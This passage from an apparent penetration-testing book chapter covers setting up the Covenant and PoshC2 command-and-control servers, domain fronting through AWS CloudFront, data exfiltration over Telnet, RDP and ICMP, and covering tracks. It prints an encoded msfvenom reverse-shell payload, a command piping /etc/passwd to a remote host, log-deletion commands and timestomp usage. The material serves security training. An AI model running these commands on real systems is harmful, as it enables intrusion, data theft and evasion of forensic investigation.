      <li class="numberedList">Now we are ready to build the application by changing our folder to the project location, which is <code class="inlineCode">cd Covenant/Covenant</code>, and run <code class="inlineCode">sudo dotnet build</code> and <code class="inlineCode">sudo dotnet run</code>.</li>
      <li class="numberedList">If no errors are generated, then attackers should be able to see the following screen and be able to access Covenant on localhost on port <code class="inlineCode">7443</code>:<figure class="mediaobject"><img src="../Images/B17765_13_21.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.21: Covenant starting in Kali using dotnet</p>
      </li>
      <li class="numberedList">Once the <a id="_idIndexMarker1439"/>application is launched in the browser, you <a id="_idIndexMarker1440"/>can create a username and password to log in.</li>
      <li class="numberedList">Similar to PowerShell Empire, Covenant provides options for the attackers to create the exploit payloads using listeners, launchers, templates, and tasks, where agents are referred to as grunts. The next step would be for attackers to create the listener and make sure that <code class="inlineCode">ConnectAddresses</code> reflects the right IP address of the Kali Linux where the grunts can call back: <figure class="mediaobject"><img src="../Images/B17765_13_22.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.22: Configuring the Covenant connect back address</p>
      </li>
      <li class="numberedList">Finally, generate the exploit payload by navigating to the launchers and selecting any of the options; for example, we have selected PowerShell Launcher. The tool should present you with the following figure and options. Upon selecting the right listeners, you should be able to generate a payload that is both encoded and non-encoded:<figure class="mediaobject"><img src="../Images/B17765_13_23.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.23: Setting the right listener and generating the payload in the PowerShell Launcher section</p>
      </li>
      <li class="numberedList">Once the <a id="_idIndexMarker1441"/>payload is executed at the target, that should <a id="_idIndexMarker1442"/>allow us to interact from the Covenant C2, as seen in <em class="italic">Figure 13.24</em>: <figure class="mediaobject"><img src="../Images/B17765_13_24.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.24: Indication of victim connecting the Covenant C2</p>
      </li>
      <li class="numberedList">We can now interact with the target by navigating to <strong class="screenText">Grunts</strong> in the main menu and <a id="_idIndexMarker1443"/>clicking on <strong class="screenText">Interact</strong> to run pre-loaded scripts <a id="_idIndexMarker1444"/>that can be run on the target device, as seen in <em class="italic">Figure 13.25</em>: <figure class="mediaobject"><img src="../Images/B17765_13_25.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.25: Interacting with the target using the Covenant Interact section</p>
      </li>
      <li class="numberedList">If there <a id="_idIndexMarker1445"/>are two or three testers on the same target, they <a id="_idIndexMarker1446"/>would be able to see all the tasks performed by clicking on the <strong class="screenText">Taskings</strong> tab. </li>
    </ol>
    <p class="normal">Covenant allows testers to leverage all the post-exploit and lateral movement modules within the tool during penetration testing to capture the crown jewels or to exfiltrate confidential database files. </p>
    <h3 id="_idParaDest-308" class="heading-3">PoshC2</h3>
    <p class="normal">One other C2 that pen <a id="_idIndexMarker1447"/>testers can also leverage is PoshC2. It is a proxy-aware <a id="_idIndexMarker1448"/>C2 framework that comes in very handy for post-exploitation and lateral movement. The tool is written in Python3, and the latest version as of December 2021 is 7.4.0. The tool has gone through significant improvements over the years. </p>
    <p class="normal">It is possible to add your own modules and tools. By default, the PoshC2 installation comes with PowerShell, C#, Python3, C++, DLLs, and shellcode. The exploit payloads injected within PoshC2 are called implants. These implants work on pretty much all operating systems, including Windows, *nix, and OSX.</p>
    <p class="normal">The following are the steps involved in successfully setting up a PoshC2 on Kali Linux:</p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1">Download the application by running <code class="inlineCode">git clone --recursive </code>(<a href="https://github.com/nettitude/PoshC2"><span class="url">https://github.com/nettitude/PoshC2</span></a>) and <code class="inlineCode">cd PoshC2</code> and run <code class="inlineCode">sudo ./Install.sh</code>.</li>
      <li class="numberedList">Testers may receive an error message relating to the dotnet; however, that does not stop the application from running.</li>
      <li class="numberedList">Set up a new project by running <code class="inlineCode">sudo posh-project –n nameoftheproject</code>.</li>
      <li class="numberedList">Once the project is set up, configure the C2 server by editing the configuration file located at <code class="inlineCode">/var/Poshc2/&lt;nameoftheproject&gt;/configure.yml</code> and edit the right <code class="inlineCode">PayloadCommsHost</code> to the right IP address or domain name. You can also choose to enter the domain’s front header (we will learn how to use the domain front in the next section).</li>
      <li class="numberedList">Finally, run the C2 server by running <code class="inlineCode">sudo posh-server</code> in the terminal and you should be able to see the confirmation as seen in <em class="italic">Figure 13.26</em>, with all the payloads and their relevant location details:<figure class="mediaobject"><img src="../Images/B17765_13_26.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.26: Successfully launching the PoshC2 server</p>
      </li>
      <li class="numberedList">Once the <a id="_idIndexMarker1449"/>payload is executed on the <a id="_idIndexMarker1450"/>target, attackers can connect to the PoshC2 server by running <code class="inlineCode">sudo posh –u &lt;username&gt;</code> in the Kali Linux terminal. They should be able to see the implant reporting to the server as seen in <em class="italic">Figure 13.27</em>. Similar to Metasploit, pen testers can now use the number of the implant to interact with the target: <figure class="mediaobject"><img src="../Images/B17765_13_27.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.27: Target reporting to the PoshC2 server as an implant</p>
      </li>
    </ol>
    <p class="normal">Although the majority <a id="_idIndexMarker1451"/>of antivirus/EDR software can detect the payload, attackers can always <a id="_idIndexMarker1452"/>leverage tools such as <code class="inlineCode">PyFuscator</code> to scramble the payload for PowerShell, successfully evade detection, and quickly migrate to a legitimate process.</p>
    <h1 id="_idParaDest-309" class="heading-1">Domain fronting</h1>
    <p class="normal">Domain fronting is a technique engaged by attackers or red teams to avoid detection of their C2 servers. It is the <a id="_idIndexMarker1453"/>art of hiding the attacker’s machine behind highly trusted domains by routing the traffic through an application utilizing someone else’s domain name (or, in the case of HTTPS, someone else’s SSL certificate).</p>
    <p class="normal">The most popular services include Amazon’s CloudFront, Microsoft Azure, and Google App Engine. The same domain fronting techniques can be used on corporate webmail for C2 and data exfiltration through SMTP protocols.</p>
    <p class="normal">Note that Google and Amazon both implemented strategies to guard against domain fronting in April 2018. In this section, we will explore how to use Amazon CloudFront and Microsoft Azure for C2, using two different methods.</p>
    <h2 id="_idParaDest-310" class="heading-2">Using Amazon CloudFront for C2</h2>
    <p class="normal">In order to improve <a id="_idIndexMarker1454"/>download speed, Amazon provides <a id="_idIndexMarker1455"/>a <strong class="keyWord">content delivery network</strong> (<strong class="keyWord">CDN</strong>) on a globally distributed <a id="_idIndexMarker1456"/>network of proxy servers that caches content such as bulky media and videos. Amazon CloudFront is a CDN offered by Amazon Web Services. The following steps are involved in creating a CDN:</p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1">Firstly, open an AWS account at <a href="https://aws.amazon.com/"><span class="url">https://aws.amazon.com/</span></a></li>
      <li class="numberedList">Log in to your account at <a href="https://console.aws.amazon.com/cloudfront/home"><span class="url">https://console.aws.amazon.com/cloudfront/home</span></a></li>
      <li class="numberedList">Click <strong class="screenText">Get Started</strong> under <strong class="screenText">Web</strong> and select <strong class="screenText">Create distribution</strong>.</li>
      <li class="numberedList">Fill in the correct details for each setting:<ul>
          <li class="bulletList"><strong class="screenText">Origin Domain Name</strong>: The domain name controlled by the attacker.</li>
          <li class="bulletList"><strong class="screenText">Origin Path</strong>: The value can be set to the root, <code class="inlineCode">/</code>.</li>
          <li class="bulletList"><strong class="screenText">Origin Path ID</strong><strong class="keyWord">: </strong>Any custom name, such as demo or C2C.</li>
          <li class="bulletList"><strong class="screenText">Origin SSL Protocols</strong>: By default, <code class="inlineCode">TLS v1.2</code>, <code class="inlineCode">TLS v1.1</code> and <code class="inlineCode">TLS v1.0</code> are enabled.</li>
          <li class="bulletList"><strong class="screenText">Origin Protocol Policy</strong>: There are three options: <strong class="screenText">HTTP</strong>, <strong class="screenText">HTTPS</strong>, and <strong class="screenText">Match Viewer</strong>. I <a id="_idIndexMarker1457"/>recommend <a id="_idIndexMarker1458"/>using <strong class="screenText">Match Viewer</strong>, which utilizes both <strong class="screenText">HTTPS</strong> and <strong class="screenText">HTTP</strong> depending on the protocol of the viewer’s request.</li>
          <li class="bulletList"><strong class="screenText">Allowed HTTP Methods</strong>: Select <strong class="screenText">GET</strong>, <strong class="screenText">HEAD</strong>, <strong class="screenText">OPTIONS, PUT,</strong> <strong class="screenText">POST</strong>, <strong class="screenText">PATCH</strong>, <strong class="screenText">DELETE</strong> in the <strong class="screenText">Default Cache</strong> behavior settings.</li>
          <li class="bulletList">Ensure for <strong class="screenText">Cache and origin request settings</strong> that you select <strong class="screenText">Use legacy cache settings</strong>.</li>
          <li class="bulletList">Ensure <strong class="screenText">Forward Cookies</strong> is set to <strong class="screenText">All</strong>.</li>
          <li class="bulletList">Ensure <strong class="screenText">Query String Forwarding and Caching</strong> is set to <strong class="screenText">Forward all, Cache based on all</strong>.</li>
        </ul>
        <figure class="mediaobject"><img src="../Images/B17765_13_28.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.28: Enabling the legacy cache settings and selecting the right options in AWS</p>
      </li>
      <li class="numberedList">Now you’re all set, so click <strong class="screenText">Create Distribution</strong>. You should see the following screen, with the domain name showing as <code class="inlineCode">&lt;somerandom&gt;.cloudfront.net</code>:<figure class="mediaobject"><img src="../Images/B17765_13_29.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.29: Successfully creating a cloud front distribution</p>
        <p class="normal">It normally takes around 5 minutes or less to bring up the distribution.</p>
      </li>
      <li class="numberedList">Once the distribution is created on AWS, you’re ready to customize the PoshC2 <a id="_idIndexMarker1459"/>agent to prepare for the attack. Before <a id="_idIndexMarker1460"/>we fire up the PoshC2, we need to ensure that we identify a vulnerable domain that can be fronting our evil server. </li>
      <li class="numberedList">Finding frontable domains can be achieved using various scripts; here, we will use the script found at <a href="https://github.com/rvrsh3ll/FindFrontableDomains"><span class="url">https://github.com/rvrsh3ll/FindFrontableDomains</span></a>, and use one of the vulnerable hosts to perform the attack.</li>
      <li class="numberedList">Let’s now go ahead and create a new listener in PoshC2. The first step is to create a PoshC2 project by running <code class="inlineCode">posh-project –n domfront</code> and then make changes to the configuration file by locating to <code class="inlineCode">/var/poshc2/domfront/config.yml</code> and editing <code class="inlineCode">PayLoadCommsHost</code> to the vulnerable host, <code class="inlineCode">DomainFrontHeader</code> to your AWS cloud distribution hostname, and then <code class="inlineCode">BindPort</code> to <code class="inlineCode">80</code>, as seen in <em class="italic">Figure 13.30</em>:<figure class="mediaobject"><img src="../Images/B17765_13_30.png" alt="Text  Description automatically generated"/></figure>
        <p class="packt_figref">Figure 13.30: Configuring the PoshC2 to run on port 80 along with the domain front header with a vulnerable host</p>
        <p class="normal">Attackers can <a id="_idIndexMarker1461"/>choose to run the C2 on port <code class="inlineCode">443</code>. Ensure <a id="_idIndexMarker1462"/>that you create the right certificate by using services such as Letsencrypt, or the CloudFront CDN will not be able to establish communication with the C2 server. </p>
      </li>
      <li class="numberedList">Once all the settings are complete for our PoshC2, attackers should be able to see the following:<figure class="mediaobject"><img src="../Images/B17765_13_31.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.31: Launching PoshC2 using the AWS cloud distribution that we created</p>
        <p class="normal">In this example, we will use the <code class="inlineCode">vijayvelu.com</code> host to forward the domain request to our C2 server. Before connecting to Amazon Web Services, the application <a id="_idIndexMarker1463"/>will perform a DNS lookup to resolve <a id="_idIndexMarker1464"/>the domain name to a network IP address. The request will go directly to the <code class="inlineCode">vijayvelu.com</code> host with the host header that we created in the Amazon CloudFront distribution.</p>
        <p class="normal">A packet capture of the request from Wireshark will look similar to <em class="italic">Figure 13.32</em>:</p>
        <figure class="mediaobject"><img src="../Images/B17765_13_32.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.32: TCP stream of the communication of DomainFrontHost to our hosting server</p>
      </li>
      <li class="numberedList">Once the payload is executed on the victim machine, you should now be able to see the implant reporting without any trace of the attacker’s IP address on the victim network. All the traffic will look like legitimate connections to AWS and the domain that is fronted:<figure class="mediaobject"><img src="../Images/B17765_13_33.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.33: Successful implanting of the exploit to the target with domain fronting</p>
      </li>
    </ol>
    <p class="normal">Attackers can <a id="_idIndexMarker1465"/>also leverage Metasploit. We will create an exploit to <a id="_idIndexMarker1466"/>provide a Meterpreter reverse HTTP shell using <code class="inlineCode">msfvenom</code>, with the domain that does the forwarding, with our header injection as follows:</p>
    <pre class="programlisting con"><code class="hljs-con">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_https lhost=&lt;VULNERABLEHOST&gt; lport=443 httphostheader=&lt; CloudFront address&gt; -e x86/shikata_ga_nai -i 8 raw | msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/bloxor -i 9 -f exe -o Domainfront.exe
</code></pre>
    <p class="normal">Execution of this payload should get a reverse shell on the C2 server that is behind the Amazon CDN. This technique was actively utilized by APT29 (a Russian nation-state hacking group) to perform covert attacks:</p>
    <figure class="mediaobject"><img src="../Images/B17765_13_34.png" alt=""/></figure>
    <figure class="mediaobject">Figure 13.34: Reverse shell to Meterpreter when the exploit was run on the target system using the domain fronting technique</figure>
    <p class="normal">Attackers may choose to utilize Microsoft CDN services for C2. Unfortunately, the CDN options are not <a id="_idIndexMarker1467"/>available for free-tier users; hence users may <a id="_idIndexMarker1468"/>have to register with the pay-as-you-go option and then create a subscription and follow the instructions at <a href="https://docs.microsoft.com/en-us/azure/cdn/cdn-create-endpoint-how-to"><span class="url">https://docs.microsoft.com/en-us/azure/cdn/cdn-create-endpoint-how-to</span></a>. However, testers need to ensure that the domain name behind either Azure or Amazon has a valid A record. For Microsoft Azure, you also need to ensure that the CNAME is pointed to the right custom domain to make domain fronting work.</p>
    <p class="normal">Although many content providers are vulnerable to this type of attack, some of the content providers, such as Google, seem to have quickly fixed this attack by making major changes to their cloud infrastructure. For example, if Company A’s domain uses Amazon’s domain as a front, with an additional host header pointing to Company B, the request will be dropped at the first node of the CDN. </p>
    <p class="normal">Similarly, other providers are trying to block these forward or fronting techniques by requiring an additional authorization token or another mechanism.</p>
    <h1 id="_idParaDest-311" class="heading-1">Exfiltration of data</h1>
    <p class="normal">The unauthorized <a id="_idIndexMarker1469"/>transfer of digital data from any environment is known as the exfiltration of data (or the extrusion of data). Once persistence is maintained on a compromised system, a set of tools can be utilized to exfiltrate data from highly secure environments.</p>
    <p class="normal">In this section, we will explore different methods that attackers utilize to send files from internal networks to attacker-controlled systems.</p>
    <h2 id="_idParaDest-312" class="heading-2">Using existing system services (Telnet, RDP, and VNC)</h2>
    <p class="normal">Firstly, we will discuss <a id="_idIndexMarker1470"/>some straightforward techniques for quickly grabbing files when access to compromised systems is time-limited. Attackers can simply open up a port using Netcat by running <code class="inlineCode">nc -lvp 2323 &gt; Exfilteredfile</code>, and then run <code class="inlineCode">cat /etc/passwd | telnet remoteIP 8000</code> from the compromised Linux server.</p>
    <p class="normal">This will display the entire contents of <code class="inlineCode">etc/passwd</code> to the remote host. As an example, we are extracting a password list from the internal host to a remote Kali machine on AWS, as seen in <em class="italic">Figure 13.35</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_13_35.png" alt=""/></figure>
    <p class="packt_figref">Figure 13.35: Exfiltration of data from a local Kali system to a remote Kali system using Telnet</p>
    <p class="normal">Another important and fairly simple technique used by attackers with access to any system on the <a id="_idIndexMarker1471"/>network is to run <code class="inlineCode">getgui</code> from the Meterpreter shell, which will enable the RDP. Once the RDP is enabled, attackers can configure their Windows attack to mount the local drive to the remote drive and exfiltrate all the files from the remote desktop to the local drive.</p>
    <p class="normal">This can be achieved by going to <strong class="screenText">Remote Desktop Connection</strong> and selecting <strong class="screenText">Show Options</strong>, then <strong class="screenText">Local Resources</strong>, then <strong class="screenText">Local devices and resources</strong>, clicking <strong class="screenText">More</strong>, and finally selecting the drive that you want to mount, as shown in <em class="italic">Figure 13.36</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_13_36.png" alt=""/></figure>
    <p class="packt_figref">Figure 13.36: Options in RDP settings to mount the drives</p>
    <p class="normal">This will mount the <code class="inlineCode">D://</code> drive of the attacker’s local machine to the RDP system. This can be confirmed <a id="_idIndexMarker1472"/>by logging in to the remote IP using the RDP connection. An additional drive (<code class="inlineCode">X:</code>) should be mounted by default, as shown in <em class="italic">Figure 13.37</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_13_37.png" alt=""/></figure>
    <p class="packt_figref">Figure 13.37: Successfully mounting the attacker’s local drive to the remote desktop</p>
    <p class="normal">Other traditional techniques involve setting up an SMB server and allowing anonymous access from compromised computers, or utilizing applications such as TeamViewer, the Skype Chrome plugin, Dropbox, Google Drive, OneDrive, WeTransfer, or any other one-click sharing service for bulk file transfers.</p>
    <h2 id="_idParaDest-313" class="heading-2">Using the ICMP protocol</h2>
    <p class="normal">There are multiple <a id="_idIndexMarker1473"/>ways to utilize the ICMP protocol to exfiltrate files, using tools such as <code class="inlineCode">hping</code>, <code class="inlineCode">nping</code>, and <code class="inlineCode">ping</code>. In this section, we will utilize the <code class="inlineCode">nping</code> utility to perform the data exfiltration of confidential documents using the ICMP protocol.</p>
    <p class="normal">In this example, we will use <code class="inlineCode">tcpdump</code> to extract the data from the <code class="inlineCode">pcap</code> dump file. Run the following command in the terminal to enable the listener:</p>
    <pre class="programlisting con"><code class="hljs-con">tcpdump -i eth0 'icmp and src host &lt;KALI IP&gt;' -w importantfile.pcap
</code></pre>
    <p class="normal">Attackers should be able to see the following:</p>
    <figure class="mediaobject"><img src="../Images/B17765_13_38.png" alt=""/></figure>
    <p class="packt_figref">Figure 13.38 Capturing the packets to receive contents</p>
    <p class="normal"><code class="inlineCode">10.10.10.12</code> is the target host that we are waiting to receive data from. On the sender’s side, once <code class="inlineCode">hping3</code> is fired at the client side (<code class="inlineCode">10.10.10.12</code>), you should receive the message <code class="inlineCode">EOF reached, wait some second than press ctrl+c</code>, as shown in <em class="italic">Figure 13.39</em>. This indicates that the file has been exfiltrated to the target server via ICMP:</p>
    <figure class="mediaobject"><img src="../Images/B17765_13_39.png" alt=""/></figure>
    <p class="packt_figref">Figure 13.39: Sending the file over the ICMP using the hping3 utility</p>
    <p class="normal">Close <code class="inlineCode">tcpdump</code> using <em class="keystroke">Ctrl</em> + <em class="keystroke">C</em>. The next step is to remove the unwanted data from the <code class="inlineCode">pcap</code> file so that we print only the specific hex value to a text file by running Wireshark or <code class="inlineCode">tshark</code>.</p>
    <p class="normal">The following is the <code class="inlineCode">tshark</code> command to filter the data fields and print just the hex value from the <code class="inlineCode">pcap</code> file:</p>
    <pre class="programlisting con"><code class="hljs-con">tshark -n -q -r importantfile.pcap -T fields -e data.data | tr -d "\n" | tr -d ":" &gt;&gt; extfilterated_hex.txt
</code></pre>
    <p class="normal">The same hex file can <a id="_idIndexMarker1474"/>now be converted with the following one-line bash command by running <code class="inlineCode">cat extfilterated_hex.txt | xxd –r –p</code>. Finally, you should be able to view the file contents, as shown in <em class="italic">Figure 13.40</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_13_40.png" alt=""/></figure>
    <p class="packt_figref">Figure 13.40: Extraction of hex data from pcap and decoding using xxd</p>
    <p class="normal">These techniques are being eased out by other sets of tools, such as utilizing TeamViewer, DropBox, and other cloud-hosting services.</p>
    <h2 id="_idParaDest-314" class="heading-2">Hiding evidence of an attack</h2>
    <p class="normal">Once a system has <a id="_idIndexMarker1475"/>been exploited, the attacker must cover their tracks <a id="_idIndexMarker1476"/>to avoid detection, or at least make reconstruction of the event more difficult for the defender.</p>
    <p class="normal">An attacker may completely delete the Windows event logs (if they are being actively retained on the compromised server). This can be done via a command shell to the system, using the following command:</p>
    <pre class="programlisting con"><code class="hljs-con">C:\&gt; del %WINDIR%\*.log /a/s/q/f
</code></pre>
    <p class="normal">The command directs all of the logs to be deleted (<code class="inlineCode">/a</code>), including all files from subfolders (<code class="inlineCode">/s</code>). The <code class="inlineCode">/q</code> option disables all of the queries, asking for a <code class="inlineCode">yes</code> or <code class="inlineCode">no</code> response, and the <code class="inlineCode">/f</code> option forcibly removes the files, making recovery more difficult.</p>
    <p class="normal">To wipe out specific <a id="_idIndexMarker1477"/>recorded files, attackers must keep track of all the <a id="_idIndexMarker1478"/>activities that have been performed on the compromised system.</p>
    <p class="normal">This can also be done from the Meterpreter prompt by using <code class="inlineCode">clearev</code>. As shown in <em class="italic">Figure 13.41</em>, this will clear the application, system, and security logs from the target (there are no options or arguments for this command):</p>
    <figure class="mediaobject"><img src="../Images/B17765_13_41.png" alt=""/></figure>
    <p class="packt_figref">Figure 13.41: Clearing the Event Logs in Windows</p>
    <p class="normal">Ordinarily, deleting a system log does not trigger any alerts to the user. In fact, most organizations configure logging so haphazardly that missing system logs are treated as a possible occurrence, and their loss is not investigated thoroughly.</p>
    <p class="normal">Apart from the traditional logs, attackers might also consider removing the <code class="inlineCode">PowerShell Operational log</code> from the victim systems.</p>
    <p class="normal">Metasploit has an additional trick up its sleeve: the <code class="inlineCode">timestomp</code> option allows an attacker to make changes to the MACE parameters of a file (the last modified, accessed, created, and MFT entry modified times of a file). Once a system has been compromised and a Meterpreter shell established, <code class="inlineCode">timestomp</code> can be invoked, as shown in <em class="italic">Figure 13.42</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_13_42.png" alt=""/></figure>
    <p class="packt_figref">Figure 13.42: Meterpreter timestomp options</p>
    <p class="normal">For example, <code class="inlineCode">C:</code> of the <a id="_idIndexMarker1479"/>compromised system contains a file named <code class="inlineCode">README.txt</code>. The MACE <a id="_idIndexMarker1480"/>values for this file indicate that it was created recently, as shown in <em class="italic">Figure 13.43</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_13_43.png" alt=""/></figure>
    <p class="packt_figref">Figure 13.43: Running timestomp on a specific local file</p>
    <p class="normal">If we wanted to hide this file, we could move it to a cluttered directory, such as <code class="inlineCode">Windows\System32</code>. However, the file would be obvious to anyone who sorted the contents of that directory on the basis of the creation dates or another MAC-based variable.</p>
    <p class="normal">Instead, you can change the timestamps of the file by running the following command:</p>
    <pre class="programlisting con"><code class="hljs-con">meterpreter &gt; timestomp -z "01/01/2001 10:10:10" README.txt
</code></pre>
    <p class="normal">This changes the timestamps of the <code class="inlineCode">README.txt</code> file, as shown in <em class="italic">Figure 13.44</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_13_44.png" alt=""/></figure>
    <p class="packt_figref">Figure 13.44: Modifying the metadata of the files to reflect false dates</p>
    <p class="normal">In order to completely <a id="_idIndexMarker1481"/>foul up an investigation, an attacker may recursively <a id="_idIndexMarker1482"/>change all of the set times in a directory or on a particular drive using the following command:</p>
    <pre class="programlisting con"><code class="hljs-con">meterpreter&gt; timestomp C:\\ -r
</code></pre>
    <p class="normal">The solution is not perfect. It is clear that an attack has occurred. Furthermore, timestamps can be retained in other locations on a hard drive and be accessible for investigation. If the target system is actively monitoring changes to system integrity using an intrusion detection system such as Tripwire, alerts of the timestomp activity will be generated. Therefore, destroying timestamps is of limited value when a truly stealthy approach is required.</p>
    <h1 id="_idParaDest-315" class="heading-1">Summary</h1>
    <p class="normal">In this chapter, we took a journey into different strategies used by attackers to maintain access to compromised environments, including domain fronting to hide the origin of the attack, and we also learned how to hide the evidence of an attack to cover our tracks and remain anonymous, which is the last step of the cyber kill chain methodology.</p>
    <p class="normal">We looked at how to use Netcat, Meterpreter, scheduled tasks, PowerShell Empire’s dbx and onedrive modules, and Covenant C2 and Poshc2 implants to maintain persistent agents on compromised systems, as well as how to exfiltrate data using traditional services such as DNS, ICMP, Telnet, RDP, and Netcat. We also learned how to find vulnerable domain fronting domains and use them for malicious activities using well-known CDNs such as Amazon and Azure.</p>
    <p class="normal">In the next chapter, we will look at how to hack embedded and RFID/NFC devices using both existing Kali 2021.4 features and additional tools.</p>
  </div>
</body></html>